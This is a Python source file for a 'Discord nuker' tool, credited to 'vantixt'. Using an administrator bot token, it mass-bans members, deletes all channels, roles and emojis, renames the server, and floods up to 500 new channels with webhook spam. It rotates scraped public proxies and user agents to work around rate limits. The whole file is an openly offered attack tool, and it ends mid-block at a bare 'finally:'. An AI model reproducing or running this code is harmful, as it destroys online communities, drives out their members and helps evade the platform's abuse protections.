import sys
import asyncio
import os
import random
import aiohttp
import requests
from pystyle import Colors, Colorate, Center
import discord
from discord.ext import commands
from colorama import Fore, Style, init
import json
import time
from itertools import cycle

init(autoreset=True)

class DiscordNuker:
    def __init__(self):
        self.banner = r"""
███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████ 
███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
███   ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ 
███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████ 
███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
 ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███ 
                       ▀                        ███    ███ 
            by vantixt
"""
        self.token = ""
        self.target_guild_id = None
        self.ban_message = "banned by vantixt"
        self.new_name = "NUKE IN PROGRESS"
        self.image_path = ""
        self.spam_message = ""
        self.channel_name_prefix = "nuke"
        self.channel_count = 500
        self.message_spam_amount = 20
        self.leave_after_nuke = True
        self.webhook_spam = True
        self.rate_limit_delay = 0.1
        self.max_concurrent_tasks = 50
        self.use_proxies = True
        self.proxy_list = []
        self.proxy_cycle = None
        self.current_proxy = None
        self.bot = None
        self.session = None
        self.webhook_sessions = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    async def fetch_proxies(self):
        try:
            print(Fore.YELLOW + "[!] Fetching fresh proxies...")
            proxy_sources = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
                "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
                "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
                "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
                "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
                "https://raw.githubusercontent.com/ProxySurf/ProxySurf/main/http.txt",
                "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
                "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
                "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
                "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
                "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
                "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
                "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt"
            ]
            for url in proxy_sources:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                proxies = [line.strip() for line in text.split('\n') if line.strip()]
                                self.proxy_list.extend(proxies)
                                print(Fore.GREEN + f"[+] Fetched {len(proxies)} proxies from {url}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error fetching proxies from {url}: {e}")
                    continue
            self.proxy_list = list(set(self.proxy_list))
            random.shuffle(self.proxy_list)
            self.proxy_cycle = cycle(self.proxy_list)
            print(Fore.GREEN + f"[+] Total unique proxies: {len(self.proxy_list)}")
        except Exception as e:
            print(Fore.RED + f"[-] Proxy fetch failed: {e}")

    def get_random_proxy(self):
        if not self.proxy_list or len(self.proxy_list) < 100:
            asyncio.create_task(self.fetch_proxies())
        if self.proxy_cycle is None and self.proxy_list:
            self.proxy_cycle = cycle(self.proxy_list)
        if self.proxy_cycle:
            proxy = next(self.proxy_cycle)
            self.current_proxy = f"http://{proxy}"
            return {"http": self.current_proxy, "https": self.current_proxy}
        return None

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def get_random_message(self):
        return self.spam_message

    def display_menu(self):
        self.clear()
        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(self.banner)))
        print("\n")
        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("discord nuker by vantixt")))
        print("\n")

    def get_inputs(self):
        self.clear()
        self.display_menu()
        self.token = input("Enter your bot token: ").strip()
        if not self.token:
            raise ValueError("Bot token cannot be empty.")
        self.image_path = input("Enter the path to the image for the server icon (leave empty to skip): ").strip()
        self.ban_message = input("Enter the ban message (default: 'DESTROYED BY NUKE'): ").strip()
        if not self.ban_message:
            self.ban_message = "DESTROYED BY NUKE"
        self.new_name = input("Enter the new server name (default: 'NUKE IN PROGRESS'): ").strip()
        if not self.new_name:
            self.new_name = "NUKE IN PROGRESS"
        self.spam_message = input("Enter the spam message: ").strip()
        if not self.spam_message:
            raise ValueError("Spam message cannot be empty.")
        self.channel_name_prefix = input("Enter the channel name prefix (default: 'nuke'): ").strip()
        if not self.channel_name_prefix:
            self.channel_name_prefix = "nuke"
        self.channel_count = input("Enter the number of channels to create (default: 500): ").strip()
        if not self.channel_count:
            self.channel_count = 500
        else:
            self.channel_count = int(self.channel_count)
        self.message_spam_amount = input("Enter the number of spam messages per channel (default: 20): ").strip()
        if not self.message_spam_amount:
            self.message_spam_amount = 20
        else:
            self.message_spam_amount = int(self.message_spam_amount)
        confirm = input("Do you want the bot to leave after nuking? (yes/no, default: yes): ").strip().lower()
        self.leave_after_nuke = confirm != 'no'
        confirm = input("Do you want to use webhook spam? (yes/no, default: yes): ").strip().lower()
        self.webhook_spam = confirm != 'no'
        confirm = input("Do you want to use proxies? (yes/no, default: yes): ").strip().lower()
        self.use_proxies = confirm != 'no'

    async def create_webhook_session(self):
        headers = {
            "User-Agent": self.get_random_user_agent(),
            "Authorization": f"Bot {self.token}"
        }
        proxy = self.get_random_proxy() if self.use_proxies else None
        connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        session = aiohttp.ClientSession(
            connector=connector,
            headers=headers,
            timeout=timeout
        )
        self.webhook_sessions.append(session)
        return session

    async def ban_members(self, guild):
        banned_count = 0
        print(Fore.YELLOW + f"\n[!] BANNING MEMBERS IN {guild.name} [!]")
        try:
            await guild.chunk()
        except discord.Forbidden:
            print(Fore.RED + "[-] Missing permissions to chunk members. Ensure 'SERVER MEMBERS INTENT' is enabled!")
            return 0
        except Exception as e:
            print(Fore.RED + f"[-] ERROR LOADING MEMBERS: {e} [!]")
            print(Fore.RED + "     Ensure 'SERVER MEMBERS INTENT' is enabled in the Discord Developer Portal!")
            return 0

        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)

        async def ban_single_member(m):
            nonlocal banned_count
            async with semaphore:
                try:
                    if m.id == self.bot.user.id:
                        print(Fore.BLUE + f"[*] SKIPPING: {m.name} (Bot)")
                        return
                    if not guild.me.top_role > m.top_role and guild.owner_id != self.bot.user.id:
                        print(Fore.YELLOW + f"[-] INSUFFICIENT PERMISSIONS TO BAN: {m.name} (Role Hierarchy)")
                        return
                    await m.ban(reason=self.ban_message, delete_message_days=7)
                    print(Fore.GREEN + f"[+] BANNED: {m.name} ({m.id})")
                    banned_count += 1
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION): {m.name} ({m.id})")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (BAN): {m.name} ({m.id}) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            await m.ban(reason=self.ban_message, delete_message_days=7)
                            print(Fore.GREEN + f"[+] BANNED (RETRY SUCCESS): {m.name} ({m.id})")
                            banned_count += 1
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (BAN): {m.name} ({m.id}) - {retry_e}")
                    else:
                        print(Fore.RED + f"[-] ERROR DURING BAN (HTTP): {m.name} ({m.id}) - {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error during ban: {e}")
                finally:
                    await asyncio.sleep(self.rate_limit_delay)

        members = list(guild.members)
        random.shuffle(members)
        batch_size = 50
        for i in range(0, len(members), batch_size):
            batch = members[i:i + batch_size]
            tasks = [ban_single_member(member) for member in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

        print(Fore.YELLOW + f"\n[!] BAN WAVE COMPLETED! BANNED: {banned_count} [!]")
        return banned_count

    async def delete_channels(self, guild):
        deleted_count = 0
        print(Fore.YELLOW + f"\n[!] DELETING CHANNELS IN {guild.name} [!]")
        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)

        async def delete_single_channel(ch):
            nonlocal deleted_count
            async with semaphore:
                try:
                    await ch.delete()
                    print(Fore.GREEN + f"[+] DELETED: {ch.name} ({ch.id})")
                    deleted_count += 1
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION): {ch.name} ({ch.id})")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (CHANNEL DELETE): {ch.name} ({ch.id}) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            await ch.delete()
                            print(Fore.GREEN + f"[+] DELETED (RETRY SUCCESS): {ch.name} ({ch.id})")
                            deleted_count += 1
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (CHANNEL DELETE): {ch.name} ({ch.id}) - {retry_e}")
                    else:
                        print(Fore.RED + f"[-] ERROR DELETING CHANNEL: {ch.name} ({ch.id}) - {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error deleting channel: {ch.name} ({ch.id}) - {e}")
                finally:
                    await asyncio.sleep(self.rate_limit_delay)

        channels = list(guild.channels)
        random.shuffle(channels)
        batch_size = 25
        for i in range(0, len(channels), batch_size):
            batch = channels[i:i + batch_size]
            tasks = [delete_single_channel(channel) for channel in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

        print(Fore.YELLOW + f"\n[!] CHANNEL DELETION COMPLETED! DELETED: {deleted_count} [!]")
        return deleted_count

    async def delete_roles(self, guild):
        deleted_count = 0
        print(Fore.YELLOW + f"\n[!] DELETING ROLES IN {guild.name} [!]")
        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)

        sorted_roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)

        async def delete_single_role(r):
            nonlocal deleted_count
            async with semaphore:
                if r.name == "@everyone" or r.id == guild.me.top_role.id:
                    print(Fore.BLUE + f"[*] SKIPPING (IMPORTANT ROLE): {r.name} ({r.id})")
                    return

                if guild.me.top_role > r:
                    try:
                        await r.delete(reason="Nuked")
                        print(Fore.GREEN + f"[+] DELETED: {r.name} ({r.id})")
                        deleted_count += 1
                    except discord.Forbidden:
                        print(Fore.RED + f"[-] FAILED (NO PERMISSION): {r.name} ({r.id})")
                    except discord.HTTPException as e:
                        if e.status == 429:
                            retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                            print(Fore.RED + f"[-] RATE LIMITED (ROLE DELETE): {r.name} ({r.id}) - Retrying in {retry_after:.2f}s")
                            await asyncio.sleep(retry_after)
                            try:
                                await r.delete(reason="Nuked")
                                print(Fore.GREEN + f"[+] DELETED (RETRY SUCCESS): {r.name} ({r.id})")
                                deleted_count += 1
                            except Exception as retry_e:
                                print(Fore.RED + f"[-] FAILED ON RETRY (ROLE DELETE): {r.name} ({r.id}) - {retry_e}")
                        else:
                            print(Fore.RED + f"[-] ERROR DELETING ROLE: {r.name} ({r.id}) - {e}")
                    except Exception as e:
                        print(Fore.RED + f"[-] Error deleting role: {r.name} ({r.id}) - {e}")
                else:
                    print(Fore.YELLOW + f"[-] INSUFFICIENT PERMISSIONS TO DELETE: {r.name} (Role Hierarchy)")
                await asyncio.sleep(self.rate_limit_delay)

        batch_size = 20
        for i in range(0, len(sorted_roles), batch_size):
            batch = sorted_roles[i:i + batch_size]
            tasks = [delete_single_role(role) for role in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

        print(Fore.YELLOW + f"\n[!] ROLE DELETION COMPLETED! DELETED: {deleted_count} [!]")
        return deleted_count

    async def delete_emojis(self, guild):
        deleted_count = 0
        print(Fore.YELLOW + f"\n[!] DELETING EMOJIS IN {guild.name} [!]")
        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)

        async def delete_single_emoji(e):
            nonlocal deleted_count
            async with semaphore:
                try:
                    await e.delete(reason="Nuked")
                    print(Fore.GREEN + f"[+] DELETED: {e.name} ({e.id})")
                    deleted_count += 1
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION): {e.name} ({e.id})")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (EMOJI DELETE): {e.name} ({e.id}) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            await e.delete(reason="Nuked")
                            print(Fore.GREEN + f"[+] DELETED (RETRY SUCCESS): {e.name} ({e.id})")
                            deleted_count += 1
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (EMOJI DELETE): {e.name} ({e.id}) - {retry_e}")
                    else:
                        print(Fore.RED + f"[-] ERROR DELETING EMOJI: {e.name} ({e.id}) - {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error deleting emoji: {e.name} ({e.id}) - {e}")
                finally:
                    await asyncio.sleep(self.rate_limit_delay)

        emojis = list(guild.emojis)
        random.shuffle(emojis)
        tasks = [delete_single_emoji(emoji) for emoji in emojis]
        await asyncio.gather(*tasks)

        print(Fore.YELLOW + f"\n[!] EMOJI DELETION COMPLETED! DELETED: {deleted_count} [!]")
        return deleted_count

    async def change_guild_properties(self, guild):
        print(Fore.YELLOW + f"\n[!] CHANGING SERVER PROPERTIES OF {guild.name} [!]")

        try:
            await guild.edit(name=self.new_name, reason="Server Name Changed by Nuker")
            print(Fore.GREEN + f"[+] SERVER NAME CHANGED TO: {self.new_name}")
        except discord.Forbidden:
            print(Fore.RED + "[-] FAILED (NO PERMISSION TO CHANGE SERVER NAME)")
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                print(Fore.RED + f"[-] RATE LIMITED (GUILD NAME CHANGE) - Retrying in {retry_after:.2f}s")
                await asyncio.sleep(retry_after)
                try:
                    await guild.edit(name=self.new_name, reason="Server Name Changed by Nuker")
                    print(Fore.GREEN + f"[+] SERVER NAME CHANGED TO (RETRY SUCCESS): {self.new_name}")
                except Exception as retry_e:
                    print(Fore.RED + f"[-] FAILED ON RETRY (GUILD NAME CHANGE): {retry_e}")
            else:
                print(Fore.RED + f"[-] ERROR CHANGING SERVER NAME: {e}")
        except Exception as e:
            print(Fore.RED + f"[-] Error changing server name: {e}")
        await asyncio.sleep(self.rate_limit_delay)

        if self.image_path:
            try:
                with open(self.image_path, "rb") as pic:
                    logo = pic.read()
                await guild.edit(icon=logo, reason="Server Icon Changed by Nuker")
                print(Fore.GREEN + f"[+] SERVER ICON CHANGED TO: {self.image_path}")
            except FileNotFoundError:
                print(Fore.RED + f"[-] ERROR: Image file not found at {self.image_path}")
            except discord.Forbidden:
                print(Fore.RED + "[-] FAILED (NO PERMISSION TO CHANGE SERVER ICON)")
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                    print(Fore.RED + f"[-] RATE LIMITED (GUILD ICON CHANGE) - Retrying in {retry_after:.2f}s")
                    await asyncio.sleep(retry_after)
                    try:
                        with open(self.image_path, "rb") as pic:
                            logo = pic.read()
                        await guild.edit(icon=logo, reason="Server Icon Changed by Nuker")
                        print(Fore.GREEN + f"[+] SERVER ICON CHANGED TO (RETRY SUCCESS): {self.image_path}")
                    except Exception as retry_e:
                        print(Fore.RED + f"[-] FAILED ON RETRY (GUILD ICON CHANGE): {retry_e}")
                else:
                    print(Fore.RED + f"[-] ERROR CHANGING SERVER ICON: {e}")
            except Exception as e:
                print(Fore.RED + f"[-] Error changing server icon: {e}")
            finally:
                await asyncio.sleep(self.rate_limit_delay)
        else:
            print(Fore.BLUE + "[*] NO IMAGE PATH PROVIDED, SKIPPING ICON CHANGE.")

    async def create_and_spam_channels(self, guild):
        print(Fore.YELLOW + f"\n[!] STARTING CHANNEL CREATION AND SPAM IN {guild.name} [!]")

        creation_semaphore = asyncio.Semaphore(self.max_concurrent_tasks // 2)
        channels_to_spam = []
        webhook_sessions = []

        async def create_channel_and_webhook():
            async with creation_semaphore:
                try:
                    channel = await guild.create_text_channel(f"{self.channel_name_prefix}-{random.randint(1000, 99999)}")
                    print(Fore.GREEN + f"[+] Created channel: {channel.name}")
                    await asyncio.sleep(self.rate_limit_delay)

                    if self.webhook_spam:
                        try:
                            webhook = await channel.create_webhook(name="NUKED")
                            print(Fore.GREEN + f"[+] Created webhook in {channel.name}")

                            webhook_session = await self.create_webhook_session()
                            webhook_sessions.append(webhook_session)

                            channels_to_spam.append({
                                "channel": channel,
                                "webhook_url": webhook.url,
                                "session": webhook_session
                            })
                        except discord.Forbidden:
                            print(Fore.RED + f"[-] FAILED (NO PERMISSION TO CREATE WEBHOOK): {channel.name}")
                            channels_to_spam.append({
                                "channel": channel,
                                "webhook_url": None,
                                "session": None
                            })
                        except discord.HTTPException as e:
                            if e.status == 429:
                                retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                                print(Fore.RED + f"[-] RATE LIMITED (WEBHOOK CREATE): {channel.name} - Retrying in {retry_after:.2f}s")
                                await asyncio.sleep(retry_after)
                                try:
                                    webhook = await channel.create_webhook(name="NUKED")
                                    print(Fore.GREEN + f"[+] Created webhook (RETRY SUCCESS) in {channel.name}")

                                    webhook_session = await self.create_webhook_session()
                                    webhook_sessions.append(webhook_session)

                                    channels_to_spam.append({
                                        "channel": channel,
                                        "webhook_url": webhook.url,
                                        "session": webhook_session
                                    })
                                except Exception as retry_e:
                                    print(Fore.RED + f"[-] FAILED ON RETRY (WEBHOOK CREATE): {channel.name} - {retry_e}")
                                    channels_to_spam.append({
                                        "channel": channel,
                                        "webhook_url": None,
                                        "session": None
                                    })
                            else:
                                print(Fore.RED + f"[-] HTTP Exception during webhook creation: {e}")
                                channels_to_spam.append({
                                    "channel": channel,
                                    "webhook_url": None,
                                    "session": None
                                })
                        except Exception as e:
                            print(Fore.RED + f"[-] Error during webhook creation: {e}")
                            channels_to_spam.append({
                                "channel": channel,
                                "webhook_url": None,
                                "session": None
                            })
                    else:
                        channels_to_spam.append({
                            "channel": channel,
                            "webhook_url": None,
                            "session": None
                        })
                except discord.Forbidden:
                    print(Fore.RED + f"[-] FAILED (NO PERMISSION TO CREATE CHANNEL)")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                        print(Fore.RED + f"[-] RATE LIMITED (CHANNEL CREATE) - Retrying in {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                        try:
                            channel = await guild.create_text_channel(f"{self.channel_name_prefix}-{random.randint(1000, 99999)}")
                            print(Fore.GREEN + f"[+] Created channel (RETRY SUCCESS): {channel.name}")
                            await asyncio.sleep(self.rate_limit_delay)
                            if self.webhook_spam:
                                try:
                                    webhook = await channel.create_webhook(name="NUKED")
                                    print(Fore.GREEN + f"[+] Created webhook in {channel.name}")

                                    webhook_session = await self.create_webhook_session()
                                    webhook_sessions.append(webhook_session)

                                    channels_to_spam.append({
                                        "channel": channel,
                                        "webhook_url": webhook.url,
                                        "session": webhook_session
                                    })
                                except Exception as webhook_e:
                                    print(Fore.RED + f"[-] FAILED WEBHOOK CREATION AFTER CHANNEL RETRY: {channel.name} - {webhook_e}")
                                    channels_to_spam.append({
                                        "channel": channel,
                                        "webhook_url": None,
                                        "session": None
                                    })
                            else:
                                channels_to_spam.append({
                                    "channel": channel,
                                    "webhook_url": None,
                                    "session": None
                                })
                        except Exception as retry_e:
                            print(Fore.RED + f"[-] FAILED ON RETRY (CHANNEL CREATE): {retry_e}")
                    else:
                        print(Fore.RED + f"[-] HTTP Exception during channel creation: {e}")
                except Exception as e:
                    print(Fore.RED + f"[-] Error during channel creation: {e}")

        batch_size = 50
        for i in range(0, self.channel_count, batch_size):
            batch_tasks = [create_channel_and_webhook() for _ in range(min(batch_size, self.channel_count - i))]
            await asyncio.gather(*batch_tasks)
            await asyncio.sleep(1)

        spam_semaphore = asyncio.Semaphore(self.max_concurrent_tasks)

        async def spam_in_channel(channel_info):
            channel = channel_info["channel"]
            webhook_url = channel_info["webhook_url"]
            webhook_session = channel_info["session"]

            async with spam_semaphore:
                for _ in range(self.message_spam_amount):
                    try:
                        if webhook_url and self.webhook_spam and webhook_session:
                            try:
                                webhook = discord.Webhook.from_url(webhook_url, session=webhook_session)
                                await webhook.send(self.get_random_message(), username="NUKED")
                                print(Fore.GREEN + f"[+] Webhook spam in {channel.name}")
                            except Exception as webhook_e:
                                print(Fore.YELLOW + f"[!] Webhook failed, falling back to regular message: {webhook_e}")
                                await channel.send(self.get_random_message())
                                print(Fore.GREEN + f"[+] Fallback message spam in {channel.name}")
                        else:
                            await channel.send(self.get_random_message())
                            print(Fore.GREEN + f"[+] Message spam in {channel.name}")
                    except discord.Forbidden:
                        print(Fore.RED + f"[-] FAILED (NO PERMISSION TO SEND MESSAGE): {channel.name}")
                    except discord.HTTPException as e:
                        if e.status == 429:
                            retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
                            print(Fore.RED + f"[-] RATE LIMITED (SPAM): {channel.name} - Retrying in {retry_after:.2f}s")
                            await asyncio.sleep(retry_after)
                            try:
                                if webhook_url and self.webhook_spam and webhook_session:
                                    webhook = discord.Webhook.from_url(webhook_url, session=webhook_session)
                                    await webhook.send(self.get_random_message(), username="NUKED")
                                    print(Fore.GREEN + f"[+] Webhook spam (RETRY SUCCESS) in {channel.name}")
                                else:
                                    await channel.send(self.get_random_message())
                                    print(Fore.GREEN + f"[+] Message spam (RETRY SUCCESS) in {channel.name}")
                            except Exception as retry_e:
                                print(Fore.RED + f"[-] FAILED ON RETRY (SPAM): {channel.name} - {retry_e}")
                        else:
                            print(Fore.RED + f"[-] HTTP Exception during spam: {e}")
                    except Exception as e:
                        print(Fore.RED + f"[-] Error during spam: {e}")
                    finally:
                        await asyncio.sleep(self.rate_limit_delay)

        batch_size = 100
        for i in range(0, len(channels_to_spam), batch_size):
            batch = channels_to_spam[i:i + batch_size]
            tasks = [spam_in_channel(channel_info) for channel_info in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

        print(Fore.YELLOW + f"\n[!] CHANNEL CREATION AND SPAM COMPLETED! [!]")

    async def leave_guild(self, guild):
        print(Fore.YELLOW + f"\n[!] BOT LEAVING SERVER {guild.name} [!]")
        try:
            await guild.leave()
            print(Fore.GREEN + "[+] SUCCESSFULLY LEFT SERVER.")
        except Exception as e:
            print(Fore.RED + f"[-] ERROR LEAVING SERVER: {e}")

    async def nuke_guild(self, guild):
        print(Fore.RED + f"\n[!] STARTING NUKE ON SERVER: {guild.name} ({guild.id}) [!]")

        if not guild.me.guild_permissions.administrator:
            print(Fore.RED + "[-] BOT DOES NOT HAVE ADMINISTRATOR PERMISSIONS!")
            return False

        tasks = [
            self.ban_members(guild),
            self.delete_emojis(guild),
            self.delete_roles(guild),
            self.delete_channels(guild),
            self.change_guild_properties(guild),
            self.create_and_spam_channels(guild)
        ]

        await asyncio.gather(*tasks)

        if self.leave_after_nuke:
            await self.leave_guild(guild)

        print(Fore.RED + f"\n[!] NUKE COMPLETED FOR SERVER: {guild.name} ({guild.id}) [!]")
        return True

    async def _close_all_sessions(self):
        print(Fore.CYAN + "[*] Closing all aiohttp sessions...")
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None

        for session in self.webhook_sessions:
            if not session.closed:
                await session.close()
        self.webhook_sessions = []

    def run_bot(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        intents.guilds = True
        intents.emojis_and_stickers = True
        intents.webhooks = True

        self.bot = commands.Bot(command_prefix="!", intents=intents)

        @self.bot.event
        async def on_ready():
            self.clear()
            self.display_menu()
            print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(f"[+] BOT IS READY: {self.bot.user.name} ({self.bot.user.id}) [+]")))
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\n[!] SELECT THE TARGET SERVER FROM THE FOLLOWING LIST: [!]")))

            if not self.bot.guilds:
                print(Colorate.Horizontal(Colors.yellow_to_white, Center.XCenter("The bot is not on any server. Please invite it to a server first!")))
                input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
                await self.bot.close()
                return

            for i, guild in enumerate(self.bot.guilds):
                print(Colorate.Horizontal(Colors.white_to_green, Center.XCenter(f"[{i+1}] {guild.name} ({guild.id}) - Members: {len(guild.members)}")))

            while True:
                try:
                    choice_input = input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nEnter the number of the target server: "))).strip()
                    choice = int(choice_input) - 1
                    if 0 <= choice < len(self.bot.guilds):
                        self.target_guild_id = self.bot.guilds[choice].id
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] Invalid choice. Please enter a valid number.")))
                except ValueError:
                    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] Invalid input. Please enter a number.")))

            target_guild = self.bot.get_guild(self.target_guild_id)
            if target_guild:
                confirm = input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(f"\n[!!!] ARE YOU SURE YOU WANT TO NUKE '{target_guild.name}'? THIS ACTION IS IRREVERSIBLE! (type 'yes' to confirm): "))).strip().lower()
                if confirm == 'yes':
                    connector = aiohttp.TCPConnector(limit=self.max_concurrent_tasks, force_close=True)
                    self.session = aiohttp.ClientSession(connector=connector)

                    if self.use_proxies:
                        asyncio.create_task(self.fetch_proxies())

                    await self.nuke_guild(target_guild)
                    await self._close_all_sessions()
                    input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nNuke process finished. Press ENTER to exit...")))
                    await self.bot.close()
                else:
                    print(Colorate.Horizontal(Colors.yellow_to_white, Center.XCenter("[!] Nuke cancelled by user.")))
                    input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
                    await self.bot.close()
            else:
                print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] Could not find the selected guild. Exiting.")))
                input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
                await self.bot.close()

        @self.bot.event
        async def on_guild_join(guild):
            print(Fore.GREEN + f"[+] Joined new guild: {guild.name} ({guild.id})")

        @self.bot.event
        async def on_disconnect():
            print(Fore.RED + "[!] Bot disconnected. Attempting to close aiohttp session...")
            await self._close_all_sessions()

        @self.bot.event
        async def on_connect():
            print(Fore.GREEN + "[+] Bot connected to Discord!")

        @self.bot.event
        async def on_resumed():
            print(Fore.YELLOW + "[*] Bot resumed connection.")

        @self.bot.event
        async def on_error(event, *args, **kwargs):
            print(Fore.RED + f"[-] AN ERROR OCCURRED: {event}")

        try:
            self.bot.run(self.token)
        except discord.errors.LoginFailure:
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] INVALID BOT TOKEN. Please check your token and try again.")))
            input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
        except discord.Forbidden:
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("[!] BOT DOES NOT HAVE NECESSARY PERMISSIONS TO CONNECT OR ACCESS GUILDS. Ensure all intents are enabled and bot has appropriate permissions.")))
            input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(f"[!] AN UNEXPECTED ERROR OCCURRED DURING BOT RUN: {e}")))
            input(Colorate.Horizontal(Colors.red_to_white, Center.XCenter("\nPress ENTER to exit...")))
        finally:
